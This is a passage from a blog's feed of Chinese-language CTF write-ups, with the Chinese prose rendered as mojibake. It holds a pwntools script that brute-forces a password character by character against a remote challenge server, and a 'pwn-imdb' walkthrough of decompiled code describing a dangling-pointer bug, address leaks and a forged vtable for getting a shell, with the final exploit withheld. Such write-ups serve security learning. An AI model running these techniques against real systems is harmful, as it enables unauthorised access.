·ã€‚è¿™é‡Œå¯ä»¥ç»•è¿‡ï¼Œåé¢è¿˜æœ‰ä¸€ä¸ªcheck()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">"passwd_has_be_changed_in_remote_"</span>, <span class="number">0x20</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Correct password!"</span>);</span><br><span class="line">    ++v1;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œçš„å¯†ç æ¯”è¾ƒå°±æ˜¯å›ºå®š32ä½ï¼Œå¯ä»¥çŒœæƒ³çœŸæ­£å¯†ç æ˜¯32ä½ï¼Œå¯ä»¥åˆ©ç”¨login()è¿›è¡Œé€ä½çˆ†ç ´ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'password'</span> + chr(x)</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Username:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'root'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">    p.sendline(password+chr(x))</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="keyword">print</span> a </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'successful'</span> <span class="keyword">in</span> a:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">if</span> login(j):</span><br><span class="line">                password += chr(j)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'password:'</span>,password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span> <span class="comment">#10_adhUNwj_qidACn_qdXon912_uhdq6</span></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easy-xor-apk&quot;&gt;&lt;a href=&quot;#easy-xor-apk&quot; class=&quot;headerlink&quot; title=&quot;easy_xor.apk&quot;&gt;&lt;/a&gt;easy_xor.apk&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwn-imdb</title>
    <link href="https://4f-kira.github.io/2018/01/30/pwn-imdb/"/>
    <id>https://4f-kira.github.io/2018/01/30/pwn-imdb/</id>
    <published>2018-01-30T01:58:32.000Z</published>
    <updated>2018-01-30T05:16:38.516Z</updated>
    
    <content type="html"><![CDATA[<p>blogå·²ç»æ­äº†ä¸€æ®µæ—¶é—´äº†ï¼Œæ‹–å»¶ç—‡å‘ä½œï¼Œä¸€ç›´æ²¡å†™ã€‚æœ€è¿‘æ²¡åšä»€ä¹ˆæœ‰æ„æ€çš„é¢˜ï¼Œå°±å†™ä¸€ä¸‹æŸCTFç¾¤çš„å…¥ç¾¤é¢˜è§£é¢˜æ€è·¯ã€‚</p><h2 id="ç¨‹åºä¼ªä»£ç "><a href="#ç¨‹åºä¼ªä»£ç " class="headerlink" title="ç¨‹åºä¼ªä»£ç "></a>ç¨‹åºä¼ªä»£ç </h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*** Welcome to IMDB ***"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    -- search for movies and TVs here\n----------------------------------------"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        add_tv();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        add_movie();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        remove();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºåŸºæœ¬åŠŸèƒ½æ˜¯æ·»åŠ tvæˆ–è€…movieï¼Œå¯ä»¥åˆ é™¤æŒ‡å®šnameçš„ï¼Œä»¥åŠæ˜¾ç¤ºæ‰€æœ‰è®°å½•ã€‚</p><h3 id="add-tv"><a href="#add-tv" class="headerlink" title="add_tv"></a>add_tv</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0xD0</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD0</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_tv;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Season? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  *(_DWORD *)(v0 + <span class="number">204</span>) = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV introduction? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New TV added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><h3 id="add-movie"><a href="#add-movie" class="headerlink" title="add_movie"></a>add_movie</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_movie</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">216u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD8</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_movie;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Actors? "</span>);</span><br><span class="line">  *(_QWORD *)(v0 + <span class="number">208</span>) = sub_400CC0(); <span class="comment">//è¿™é‡Œä¼šé¢å¤–ç”³è¯·ä¸€å—å†…å­˜æ”¾æ•°æ®</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie introduction? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New movie added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  v1 = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV/Movie name to remove? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v4, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)list_table[v0];</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp;&amp; !<span class="built_in">strcmp</span>(v2 + <span class="number">8</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">const</span> <span class="keyword">char</span> *, __int64 *))(*(_QWORD *)v2 + <span class="number">16L</span>L))(v2, &amp;v4);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != <span class="number">32</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Not found."</span>);</span><br><span class="line">  list_table[v1] = <span class="number">0L</span>L;   <span class="comment">//è¿™é‡Œåªæ¸…0äº†æœ€åä¸€ä¸ª</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Removed successfully"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹æ˜¯ï¼šremoveé‚£é‡Œå¯ä»¥æ‰¹é‡åˆ é™¤nameä¸€æ ·çš„ï¼Œä½†æ˜¯åªæ¸…ç©ºäº†æœ€åä¸€ä¸ªæŒ‡é’ˆã€‚</p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> (**v1)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...); <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  v1 = (<span class="keyword">int</span> (**)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...))list_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      (**(<span class="keyword">void</span> (***)(<span class="keyword">void</span>))*v1)();</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != &amp;<span class="built_in">printf</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"No Movie/TV exists!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ­¥éª¤"><a href="#åˆ©ç”¨æ­¥éª¤" class="headerlink" title="åˆ©ç”¨æ­¥éª¤"></a>åˆ©ç”¨æ­¥éª¤</h2><p>å…ˆåˆ›å»º3ä¸ªåå­—ä¸€æ ·çš„tvï¼Œç„¶åéƒ½åˆ æ‰ï¼Œå†åˆ›å»ºä¸€ä¸ªmovieï¼Œå…¶ä¸­movieçš„actorä¼šåœ¨å †ä¸­ç”³è¯·ä¸€ç‰‡å†…å­˜å†™å…¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡actorï¼Œä¼ªé€ ä¸€ä¸ªmovieï¼Œå¯ä»¥æ§åˆ¶actorçš„æŒ‡é’ˆï¼Œç„¶åshowçš„æ—¶å€™å°±å¯ä»¥ä»»æ„åœ°å€è¯»äº†ã€‚ä¸‹é¢æ˜¯movieæ‰“å°ä¿¡æ¯çš„å‡½æ•°ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_4011B0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           <span class="string">"Movie &lt;%s&gt;: %s rating: %.2f actors: %s\n"</span>,</span><br><span class="line">           a1 + <span class="number">8</span>,</span><br><span class="line">           a1 + <span class="number">72</span>,</span><br><span class="line">           *(_QWORD *)(a1 + <span class="number">208</span>),  <span class="comment">//è¿™é‡Œå¯ä»¥ç”¨æ¥ä»»æ„åœ°å€è¯»</span></span><br><span class="line">           *(<span class="keyword">float</span> *)(a1 + <span class="number">200</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡è¿™ä¸ªæ–¹æ³•å¯ä»¥æ³„éœ²å‡ºmallocåœ°å€ï¼Œä»¥åŠlist_tableåœ°å€ã€‚ï¼ˆå¯ä»¥è®¡ç®—magic gadgetï¼‰</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>ä¼ªé€ movieçš„è™šè¡¨vtableï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬å¯æ§çš„å†…å­˜ï¼ˆæ³„éœ²äº†heapåœ°å€ï¼Œå°†magic gadgetåœ°å€å†™å…¥heapä¸­å°±è¡Œäº†ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000004015A0 ; `vtable for&apos;Movie</span><br><span class="line">.rodata:00000000004015A0 _ZTV5Movie      dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015A8                 dq offset _ZTI5Movie    ; `typeinfo for&apos;Movie</span><br><span class="line">.rodata:00000000004015B0 printf_movie    dq offset sub_4011B0    ; DATA XREF: add_movie+24â†‘o  //æ”¹æˆmagicåœ°å€</span><br><span class="line">.rodata:00000000004015B8                 dq offset nullsub_2</span><br><span class="line">.rodata:00000000004015C0                 dq offset j___ZdlPv     ; operator delete(void *)</span><br><span class="line">.rodata:00000000004015C8                 align 20h</span><br><span class="line">.rodata:00000000004015E0 ; `vtable for&apos;TV</span><br><span class="line">.rodata:00000000004015E0 _ZTV2TV         dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015E8                 dq offset _ZTI2TV       ; `typeinfo for&apos;TV</span><br><span class="line">.rodata:00000000004015F0 printf_tv       dq offset sub_4011E0    ; DATA XREF: add_tv+24â†‘o</span><br><span class="line">.rodata:00000000004015F8                 dq offset nullsub_1</span><br><span class="line">.rodata:0000000000401600                 dq offset j___ZdlPv_0   ; operator delete(void *)</span><br></pre></td></tr></table></figure></p><p>showçš„æ—¶å€™ï¼Œlist_tableçš„å¼€å¤´å­˜æ”¾è¿™vtableçš„åœ°å€ï¼Œvtableçš„å¼€å¤´æ˜¯æ‰“å°å‡½æ•°ï¼Œå¦‚æœä¼ªé€ vtableçš„æŒ‡å‘magicï¼Œå°±å¯ä»¥ç›´æ¥getshelläº†ã€‚</p><p>æœ¬é¢˜æ²¡æœ‰æä¾›libcï¼Œéœ€è¦é€šè¿‡æ³„éœ²åœ°å€çš„å3ä½æ¥æŸ¥æ‰¾ã€‚<br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>æš‚æ—¶ä¸æ”¾</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>èœé¸Ÿä¹±å†™ä¸€é€šï¼Œçœ‹ä¸æ‡‚ä¸è¦å–·ï¼Œæ¬¢è¿çº æ­£ã€‚å®Œæˆï¼Œæ’’èŠ±~~~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;blogå·²ç»æ­äº†ä¸€æ®µæ—¶é—´äº†ï¼Œæ‹–å»¶ç—‡å‘ä½œï¼Œä¸€ç›´æ²¡å†™ã€‚æœ€è¿‘æ²¡åšä»€ä¹ˆæœ‰æ„æ€çš„é¢˜ï¼Œå°±å†™ä¸€ä¸‹æŸCTFç¾¤çš„å…¥ç¾¤é¢˜è§£é¢˜æ€è·¯ã€‚&lt;/p&gt;
&lt;h2 id=&quot;ç¨‹åºä¼ªä»£ç &quot;&gt;&lt;a href=&quot;#ç¨‹åºä¼ªä»£ç &quot; class=&quot;headerlink&quot; title=&quot;ç¨‹åºä¼ªä»£ç &quot;&gt;&lt;/a&gt;ç¨‹åºä¼ªä»£ç &lt;/h
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
